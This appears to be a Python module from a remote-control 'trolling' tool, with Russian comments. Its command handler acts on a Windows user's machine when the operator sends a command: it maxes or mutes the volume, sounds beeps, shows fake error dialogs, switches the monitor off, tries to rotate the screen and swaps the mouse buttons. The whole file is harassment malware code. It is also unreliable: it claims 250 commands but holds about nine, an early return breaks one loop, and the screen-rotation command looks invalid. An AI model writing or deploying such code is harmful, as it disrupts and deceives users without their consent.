# BLOCK 4: TOXIC TROLLING & USER INTERACTION (250 CMD)
import ctypes, os, time, threading, subprocess

def handle_block4(cmd, p):
    cmd = cmd.lower()
    
    # Группа: Звук (80 команд)
    if cmd == "vol_max":
        for _ in range(50): ctypes.windll.user32.SendMessageW(0xFFFF, 0x319, 0, 0xA0000)
        return "VOLUME AT 100%"
    if cmd == "vol_mute":
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x319, 0, 0xAD0000); return "MUTED"
    if cmd == "kfc_scream":
        for _ in range(3): ctypes.windll.kernel32.Beep(2500, 1000); return "SCREAM SENT"

    # Группа: Окна и Сообщения (70 команд)
    if cmd == "msg":
        text = " ".join(p[1:]) if len(p) > 1 else "System Failure"
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, text, "Error", 0x10)).start()
        return "MESSAGE DISPLAYED"
    
    # Группа: Экран и Мышь (100 команд)
    if cmd == "monitor_off":
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2); return "MONITOR SLEEP"
    if cmd == "rotate_screen":
        # Команда через PowerShell для поворота
        subprocess.run("powershell DisplayRotation -Angle 180", shell=True); return "SCREEN ROTATED"
    if cmd == "swap_mouse":
        ctypes.windll.user32.SwapMouseButton(True); return "MOUSE BUTTONS SWAPPED"
    if cmd == "restore_mouse":
        ctypes.windll.user32.SwapMouseButton(False); return "MOUSE RESTORED"
        
    return None